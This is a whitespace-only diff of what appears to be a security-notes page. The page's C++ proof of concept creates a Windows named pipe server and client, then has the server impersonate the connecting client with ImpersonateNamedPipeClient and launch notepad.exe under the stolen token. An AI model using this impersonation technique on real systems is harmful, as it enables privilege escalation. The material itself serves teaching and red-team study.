@@ -27,30 +27,30 @@ Below is the PoC for both the server and the client:
 #include <iostream>
 
 int main() {
-	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
-	LPVOID pipeBuffer = NULL;
-	HANDLE serverPipe;
-	DWORD readBytes = 0;
-	DWORD readBuffer = 0;
-	int err = 0;
-	BOOL isPipeConnected;
-	BOOL isPipeOpen;
-	wchar_t message[] = L"HELL";
-	DWORD messageLenght = lstrlen(message) * 2;
-	DWORD bytesWritten = 0;
+    LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
+    LPVOID pipeBuffer = NULL;
+    HANDLE serverPipe;
+    DWORD readBytes = 0;
+    DWORD readBuffer = 0;
+    int err = 0;
+    BOOL isPipeConnected;
+    BOOL isPipeOpen;
+    wchar_t message[] = L"HELL";
+    DWORD messageLenght = lstrlen(message) * 2;
+    DWORD bytesWritten = 0;
 
-	std::wcout << "Creating named pipe " << pipeName << std::endl;
-	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-	
-	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
-	if (isPipeConnected) {
-		std::wcout << "Incoming connection to " << pipeName << std::endl;
-	}
-	
-	std::wcout << "Sending message: " << message << std::endl;
-	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
-	
-	return 0;
+    std::wcout << "Creating named pipe " << pipeName << std::endl;
+    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
+
+    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+    if (isPipeConnected) {
+        std::wcout << "Incoming connection to " << pipeName << std::endl;
+    }
+
+    std::wcout << "Sending message: " << message << std::endl;
+    WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
+
+    return 0;
 }
 ```
 {% endtab %}
@@ -65,21 +65,21 @@ const int MESSAGE_SIZE = 512;
 
 int main()
 {
-	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
-	HANDLE clientPipe = NULL;
-	BOOL isPipeRead = true;
-	wchar_t message[MESSAGE_SIZE] = { 0 };
-	DWORD bytesRead = 0;
+    LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
+    HANDLE clientPipe = NULL;
+    BOOL isPipeRead = true;
+    wchar_t message[MESSAGE_SIZE] = { 0 };
+    DWORD bytesRead = 0;
 
-	std::wcout << "Connecting to " << pipeName << std::endl;
-	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-	
-	while (isPipeRead) {
-		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
-		std::wcout << "Received message: " << message;
-	}
+    std::wcout << "Connecting to " << pipeName << std::endl;
+    clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
-	return 0;
+    while (isPipeRead) {
+        isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
+        std::wcout << "Received message: " << message;
+    }
+
+    return 0;
 }
 ```
 {% endtab %}
@@ -119,44 +119,44 @@ Note that in order to impersonate the token of the client process you need to ha
 
 It is possible for the named pipe server to impersonate the named pipe client's security context by leveraging a `ImpersonateNamedPipeClient` API call which in turn changes the named pipe server's current thread's token with that of the named pipe client's token.
 
-We can update the the named pipe server's code like this to achieve the impersonation - note that modifications are seen in line 25 and below: 
+We can update the the named pipe server's code like this to achieve the impersonation - note that modifications are seen in line 25 and below:
 
 ```cpp
 int main() {
-	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
-	LPVOID pipeBuffer = NULL;
-	HANDLE serverPipe;
-	DWORD readBytes = 0;
-	DWORD readBuffer = 0;
-	int err = 0;
-	BOOL isPipeConnected;
-	BOOL isPipeOpen;
-	wchar_t message[] = L"HELL";
-	DWORD messageLenght = lstrlen(message) * 2;
-	DWORD bytesWritten = 0;
+    LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
+    LPVOID pipeBuffer = NULL;
+    HANDLE serverPipe;
+    DWORD readBytes = 0;
+    DWORD readBuffer = 0;
+    int err = 0;
+    BOOL isPipeConnected;
+    BOOL isPipeOpen;
+    wchar_t message[] = L"HELL";
+    DWORD messageLenght = lstrlen(message) * 2;
+    DWORD bytesWritten = 0;
 
-	std::wcout << "Creating named pipe " << pipeName << std::endl;
-	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
-	
-	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
-	if (isPipeConnected) {
-		std::wcout << "Incoming connection to " << pipeName << std::endl;
-	}
-	
-	std::wcout << "Sending message: " << message << std::endl;
-	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
-	
-	std::wcout << "Impersonating the client..." << std::endl;
-	ImpersonateNamedPipeClient(serverPipe);
-	err = GetLastError();	
+    std::wcout << "Creating named pipe " << pipeName << std::endl;
+    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
 
-	STARTUPINFO	si = {};
-	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
-	PROCESS_INFORMATION pi = {};
-	HANDLE threadToken = GetCurrentThreadToken();
-	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
+    if (isPipeConnected) {
+        std::wcout << "Incoming connection to " << pipeName << std::endl;
+    }
 
-	return 0;
+    std::wcout << "Sending message: " << message << std::endl;
+    WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
+
+    std::wcout << "Impersonating the client..." << std::endl;
+    ImpersonateNamedPipeClient(serverPipe);
+    err = GetLastError();    
+
+    STARTUPINFO    si = {};
+    wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
+    PROCESS_INFORMATION pi = {};
+    HANDLE threadToken = GetCurrentThreadToken();
+    CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+    return 0;
 }
 ```
 
